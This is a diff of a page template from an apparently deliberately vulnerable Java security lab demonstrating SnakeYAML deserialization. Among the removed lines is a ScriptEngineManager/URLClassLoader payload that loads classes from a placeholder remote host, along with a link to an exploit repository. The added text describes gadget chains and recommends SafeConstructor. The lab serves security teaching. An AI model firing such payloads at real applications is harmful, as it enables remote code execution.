@@ -14,8 +14,8 @@
                     <blockquote class="layui-elem-quote layui-quote-nm"
                                 style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                         <p>
-                        <pre>  SnakeYAML是一个用于解析和生成YAML格式数据的流行Java库，支持YAML1.1和1.2规范，能够实现YAML与Java对象之间的序列化和反序列化</pre>
-                        <pre>  漏洞原理：yaml反序列化时可以通过!!+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造ScriptEngineManager payload并利用SPI机制通过URLClassLoader或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行</pre>
+                        <pre>  SnakeYAML 是 Java 常用 YAML 解析库。使用默认 Constructor 解析不可信 YAML 时，攻击者可能通过 !!全类名 指定任意 Java 类型，触发对象实例化、构造器、setter 或类加载链路。</pre>
+                        <pre>  安全解析应使用 SafeConstructor 或受限 LoaderOptions，只允许标量、列表、Map 等基础数据结构进入业务层；不要把用户提交的 YAML 直接映射为任意 Java 对象。</pre>
                         </p>
                     </blockquote>
                 </fieldset>
@@ -29,13 +29,15 @@
                             <div class="layui-tab-content">
                                 <div class="layui-tab-item layui-show">
                                     <blockquote class="layui-elem-quote main_btn">
-                                        <p>   漏洞利用参考：<a target="_blank" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a> </p>
-                                        <a target="_blank" href='snakeYaml/vul?payload=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B"http://替换为dnslog地址/"%5D%5D%5D%5D'>
-<!--                                        <a target="_blank" href="/snakeYaml/vul">-->
-                                            <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
+                                        <form class="layui-form" style="display: flex; justify-content: space-between;">
+                                            <input type="text" name="payload" style="width: 450px;"
+                                                   value="!!top.whgojp.modules.sqli.entity.Sqli {id: 1, username: test, password: pass}"
+                                                   class="layui-input" id="vul-SnakeYaml-input">
+                                            <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;"
+                                                    lay-filter="vul-SnakeYaml-submit" lay-submit="">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
-                                        </a>
+                                        </form>
                                     </blockquote>
                                 </div>
 
@@ -43,11 +45,16 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">反序列化流程:
-  1、导入依赖：使用Maven/Gradle项目时，首先添加SnakeYAML的依赖
-  2、创建Yaml实例：使用Yaml类的实例来处理反序列化。可以通过无参构造函数创建，也可以通过传递一个Constructor来定制化反序列化的方式(如使用SafeConstructor提高安全性)
-  3、调用load()方法：使用Yaml实例的load()方法，将YAML字符串或输入流转换为相应的Java对象
-  4、处理反序列化后的对象：根据实际业务需求对反序列化后的对象进行处理</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">默认 Yaml.load() 会根据 YAML 标签构造 Java 对象。示例 payload 使用项目内 Sqli 类，便于稳定观察“类型被实例化”的效果；真实攻击还可能结合 ScriptEngineManager、URLClassLoader、JNDI 或组件 gadget 链。</pre>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="layui-col-md12">
+                                    <div class="layui-card">
+                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果</div>
+                                        <div class="layui-card-body layui-text layadmin-text">
+                                            <pre id="vul-SnakeYaml-result" style="color: red;font-size: 15px;"></pre>
                                         </div>
                                     </div>
                                 </div>
@@ -73,12 +80,15 @@
                             <div class="layui-tab-content">
                                 <div class="layui-tab-item layui-show">
                                     <blockquote class="layui-elem-quote main_btn">
-                                        <p>使用SafeConstructor()进行安全构造</p>
-                                        <a target="_blank" href="/snakeYaml/safe">
-                                            <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
+                                        <form class="layui-form" style="display: flex; justify-content: space-between;">
+                                            <input type="text" name="payload" style="width: 450px;"
+                                                   value="name: JavaSecLab"
+                                                   class="layui-input" id="safe-SnakeYaml-input">
+                                            <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;"
+                                                    lay-filter="safe-SnakeYaml-submit" lay-submit="">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
-                                        </a>
+                                        </form>
                                     </blockquote>
                                 </div>
 
@@ -86,7 +96,16 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">   SafeConstructor是SnakeYAM 提供的一个安全构造器，用于防止反序列化漏洞，确保只反序列化基本类型和安全的对象</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">SafeConstructor 只解析基础 YAML 类型，不允许通过 !!全类名 任意实例化 Java 对象。安全场景应返回普通 Map/List/标量结果，带 Java 类型标签的 payload 应被拒绝。</pre>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="layui-col-md12">
+                                    <div class="layui-card">
+                                        <div class="layui-card-header"><i class="fa fa-warning icon-output-safe"></i>测试结果</div>
+                                        <div class="layui-card-body layui-text layadmin-text">
+                                            <pre id="safe-SnakeYaml-result" style="color: red;font-size: 15px;"></pre>
                                         </div>
                                     </div>
                                 </div>
@@ -123,6 +142,9 @@
 
             miniTab.listen();
             layer.msg("反序列化 - SnakeYaml");
+
+            common.formListenFun("vul-SnakeYaml-submit", "", "/snakeYaml/vul", "vul-SnakeYaml-result", "post");
+            common.formListenFun("safe-SnakeYaml-submit", "", "/snakeYaml/safe", "safe-SnakeYaml-result", "post");
 
             var cmConfig = {
                 lineNumbers: true,
@@ -169,7 +191,7 @@
                 closeBtn: 1,
                 area: ['781px', '440px'], // 宽高可以根据需要调整
                 shadeClose: true,
-                content: '<div style="text-align: center;"><img src="/static/images/vul/components/deserialize.jpg" style="width: 100%; height: 50%;"></div>'
+                content: '<div style="text-align: center;"><img src="/images/vul/components/deserialize.jpg" style="width: 100%; height: 50%;"></div>'
             });
         });
 
